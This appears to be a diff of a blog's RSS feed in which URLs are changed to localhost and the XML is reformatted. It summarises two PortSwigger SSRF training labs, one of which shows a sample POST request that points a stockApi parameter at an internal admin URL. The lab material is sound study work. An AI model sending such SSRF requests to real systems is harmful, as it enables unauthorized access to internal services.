@@ -1,11 +1,29 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Server-Side Vulnerabilities on G.R</title><link>https://grcheulishvili.github.io/archive/raw-notes-ssrf/</link><description>Recent content in Server-Side Vulnerabilities on G.R</description><generator>Hugo</generator><language>en-US</language><atom:link href="https://grcheulishvili.github.io/archive/raw-notes-ssrf/index.xml" rel="self" type="application/rss+xml"/><item><title>SSRF against external back-end system [PortSwigger Lab]</title><link>https://grcheulishvili.github.io/archive/raw-notes-ssrf/1c2-ssrf-against-external-back-end-system-portswigger-lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://grcheulishvili.github.io/archive/raw-notes-ssrf/1c2-ssrf-against-external-back-end-system-portswigger-lab/</guid><description>&lt;p&gt;The same principle applies for remote SSRF. An attacker can submit the following request to access the admin interface&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;POST /product/stock HTTP/1.0 
-Content-Type: application/x-www-form-urlencoded 
-Content-Length: 118
-
-stockApi=http://192.168.0.68/admin
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The same example as previous, but for remote API:&lt;/p&gt;</description></item><item><title>SSRF against local interface [Portswigger Lab]</title><link>https://grcheulishvili.github.io/archive/raw-notes-ssrf/1c1-ssrf-against-local-interface-portswigger-lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://grcheulishvili.github.io/archive/raw-notes-ssrf/1c1-ssrf-against-local-interface-portswigger-lab/</guid><description>&lt;h3 id="problem"&gt;&lt;strong&gt;Problem&lt;/strong&gt;&lt;/h3&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;This lab has a stock check feature which fetches data from an internal system.
-
-To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;URL: &lt;a href="https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/"&gt;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/&lt;/a&gt;&lt;/p&gt;</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Server-Side Vulnerabilities on G.R</title>
+		<link>http://localhost:1313/archive/raw-notes-ssrf/</link>
+		<description>Recent content in Server-Side Vulnerabilities on G.R</description>
+		<generator>Hugo</generator>
+		<language>en-US</language>
+		
+		
+		
+		
+			<atom:link href="http://localhost:1313/archive/raw-notes-ssrf/index.xml" rel="self" type="application/rss+xml" />
+			<item>
+				<title>SSRF against external back-end system [PortSwigger Lab]</title>
+				<link>http://localhost:1313/archive/raw-notes-ssrf/1c2-ssrf-against-external-back-end-system-portswigger-lab/</link>
+				<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+				<guid>http://localhost:1313/archive/raw-notes-ssrf/1c2-ssrf-against-external-back-end-system-portswigger-lab/</guid>
+				<description>&lt;p&gt;The same principle applies for remote SSRF. An attacker can submit the following request to access the admin interface&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /product/stock HTTP/1.0 &#xA;Content-Type: application/x-www-form-urlencoded &#xA;Content-Length: 118&#xA;&#xA;stockApi=http://192.168.0.68/admin&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The same example as previous, but for remote API:&lt;/p&gt;</description>
+			</item>
+			<item>
+				<title>SSRF against local interface [Portswigger Lab]</title>
+				<link>http://localhost:1313/archive/raw-notes-ssrf/1c1-ssrf-against-local-interface-portswigger-lab/</link>
+				<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+				<guid>http://localhost:1313/archive/raw-notes-ssrf/1c1-ssrf-against-local-interface-portswigger-lab/</guid>
+				<description>&lt;h3 id=&#34;problem&#34;&gt;&lt;strong&gt;Problem&lt;/strong&gt;&lt;/h3&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;This lab has a stock check feature which fetches data from an internal system.&#xA;&#xA;To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;URL: &lt;a href=&#34;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/&#34;&gt;https://0a4f00b403f04c6c8165a70d000b0073.web-security-academy.net/&lt;/a&gt;&lt;/p&gt;</description>
+			</item>
+	</channel>
+</rss>
